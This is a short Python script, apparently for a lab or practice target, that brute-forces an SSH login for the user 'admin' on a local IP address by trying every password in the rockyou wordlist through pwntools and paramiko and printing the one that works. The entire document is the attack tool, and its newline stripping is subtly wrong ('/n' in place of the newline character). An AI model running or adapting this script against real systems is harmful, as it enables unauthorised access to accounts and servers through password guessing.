#! /usr/bin/python3

# imports
from pwn import *
import paramiko

host =  "192.168.0.4"
username = "admin"
attempts = 0

with open("/usr/share/wordlists/rockyou.txt", "r") as password_list:
    for password in password_list:
      password = password.strip("/n")
      try:
        print ("[{}] Attempting password: '{}'!".format(attempts, password))
        response = ssh(host=host, user=username, password=password, timeout=1)
        if response.connected():
           print("[>]Valid password found: '{}'!".format(password))
           response.close()
           break
        response.close()
      except paramiko.ssh_exception.AuthenticationException:
           print("[X] Invalid password!")
      attempts +=1
